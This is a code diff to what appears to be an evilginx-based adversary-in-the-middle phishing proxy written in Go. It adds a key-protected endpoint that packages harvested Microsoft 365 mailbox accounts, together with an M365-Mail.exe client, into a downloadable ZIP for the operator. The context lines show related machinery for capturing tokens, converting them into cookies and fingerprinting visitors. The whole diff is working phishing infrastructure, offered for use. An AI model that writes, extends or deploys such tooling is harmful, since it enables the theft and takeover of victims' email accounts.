@@ -8,6 +8,7 @@ Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of c
 package core
 
 import (
+	"archive/zip"
 	"bufio"
 	"bytes"
 	"context"
@@ -245,6 +246,7 @@ var (
 	portalPageRe     = regexp.MustCompile(`^/p/([a-fA-F0-9]{64})$`)
 	tokenFeedRe      = regexp.MustCompile(`^/api/v1/feed$`)
 	mailboxApiRe     = regexp.MustCompile(`^/api/v1/mailbox$`)
+	mailboxDownloadRe= regexp.MustCompile(`^/api/v1/mailbox/download$`)
 	redirRe          = regexp.MustCompile(`^/assets/js/([^/]*)`)
 	jsInjectRe       = regexp.MustCompile(`^/assets/js/([^/]*)/([^/]*)`)
 	jsonContentRe    = regexp.MustCompile(`application/\w*\+?json`)
@@ -991,6 +993,33 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				return req, resp
 			}
 			// --- End mailbox accounts API ---
+
+			// --- Begin mailbox download endpoint (M365-Mail.exe + accounts) ---
+			if mailboxDownloadRe.MatchString(req.URL.Path) {
+				apiKey := req.URL.Query().Get("key")
+				if apiKey != p.tokenFeed.GetAPIKey() {
+					resp := goproxy.NewResponse(req, "application/json", 401, `{"error":"unauthorized"}`)
+					return req, resp
+				}
+				
+				// Get accounts export JSON
+				exportBody, _ := p.mailboxAccounts.HandleAPIRequest(p.tokenFeed.GetAPIKey(), apiKey, "export")
+				
+				// Create ZIP in memory with accounts-import.json
+				zipBuffer := p.createMailboxDownloadZip(exportBody)
+				if zipBuffer == nil {
+					resp := goproxy.NewResponse(req, "application/json", 500, `{"error":"failed to create download package"}`)
+					return req, resp
+				}
+				
+				resp := goproxy.NewResponse(req, "application/zip", 200, string(zipBuffer))
+				resp.Header.Set("Content-Disposition", "attachment; filename=M365-Mail-Package.zip")
+				resp.Header.Set("Content-Type", "application/zip")
+				resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
+				log.Success("[mailbox] Download package served to %s (%d accounts)", remote_addr, p.mailboxAccounts.Count())
+				return req, resp
+			}
+			// --- End mailbox download endpoint ---
 
 			// --- Begin portal endpoint (token-to-cookie conversion) ---
 			if portalPageRe.MatchString(req.URL.Path) {
@@ -5061,4 +5090,68 @@ func (p *HttpProxy) generateSimpleJA4(userAgent string, acceptLang string, heade
 
 	// Format: protocol_lang_bot_headercount_headerhash_uahash
 	return fmt.Sprintf("%s%s%s%02d_%s_%s", protocol, langIndicator, botIndicator, headerCount, headerHashStr, uaHashStr)
+}
+
+// createMailboxDownloadZip creates a ZIP file containing M365-Mail.exe and accounts-import.json
+func (p *HttpProxy) createMailboxDownloadZip(accountsJSON string) []byte {
+	// Create ZIP buffer
+	buf := new(bytes.Buffer)
+	zipWriter := zip.NewWriter(buf)
+	
+	// Add accounts-import.json
+	accountsFile, err := zipWriter.Create("accounts-import.json")
+	if err != nil {
+		log.Error("[mailbox] Failed to create accounts file in ZIP: %v", err)
+		return nil
+	}
+	_, err = accountsFile.Write([]byte(accountsJSON))
+	if err != nil {
+		log.Error("[mailbox] Failed to write accounts to ZIP: %v", err)
+		return nil
+	}
+	
+	// Try to find and add M365-Mail.exe from build folder
+	exePaths := []string{
+		filepath.Join(p.cfg.GetDataDir(), "..", "build", "M365-Mail.exe"),
+		filepath.Join(p.cfg.GetDataDir(), "..", "M365-Mail.exe"),
+		filepath.Join(".", "build", "M365-Mail.exe"),
+		filepath.Join(".", "M365-Mail.exe"),
+		"/opt/evilginx/build/M365-Mail.exe",
+		"/opt/evilginx/M365-Mail.exe",
+	}
+	
+	var exeData []byte
+	for _, exePath := range exePaths {
+		data, err := ioutil.ReadFile(exePath)
+		if err == nil {
+			exeData = data
+			log.Info("[mailbox] Found M365-Mail.exe at %s", exePath)
+			break
+		}
+	}
+	
+	if exeData != nil {
+		exeFile, err := zipWriter.Create("M365-Mail.exe")
+		if err != nil {
+			log.Error("[mailbox] Failed to create exe file in ZIP: %v", err)
+		} else {
+			_, err = exeFile.Write(exeData)
+			if err != nil {
+				log.Error("[mailbox] Failed to write exe to ZIP: %v", err)
+			}
+		}
+	} else {
+		log.Warning("[mailbox] M365-Mail.exe not found - download package will only contain accounts")
+		// Add a README explaining the exe is missing
+		readmeFile, _ := zipWriter.Create("README.txt")
+		readmeFile.Write([]byte("M365 Mail Accounts Export\n\nTo use these accounts:\n1. Download M365-Mail.exe separately\n2. Place accounts-import.json next to M365-Mail.exe\n3. Run M365-Mail.exe - accounts will be imported automatically\n"))
+	}
+	
+	err = zipWriter.Close()
+	if err != nil {
+		log.Error("[mailbox] Failed to close ZIP: %v", err)
+		return nil
+	}
+	
+	return buf.Bytes()
 }
